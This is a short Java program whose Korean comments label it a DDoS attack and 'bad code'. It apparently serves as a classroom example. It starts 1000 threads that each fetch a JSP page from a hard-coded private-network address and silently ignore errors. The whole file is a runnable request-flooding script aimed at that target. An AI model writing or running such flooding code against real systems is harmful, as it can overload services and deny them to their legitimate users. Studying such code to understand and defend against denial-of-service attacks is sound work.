import java.io.InputStream;
import java.net.URL;

public class Connector {

	// DDos 공격이다.
	// Bad code
	public static void main(String[] args) throws Exception {

		for (int i = 0; i < 1000; i++) {

			new Thread(() -> {
				try {
					// 타겟 주소.
					URL url = new URL("http://192.168.41.43:8080/web1/hello.jsp");
					InputStream in = url.openStream();
					byte[] arr = new byte[1024*8];
					in.read(arr);
					System.out.println(new String(arr));
				} catch (Exception e) {

				}
			}).start();
		}

	}

}
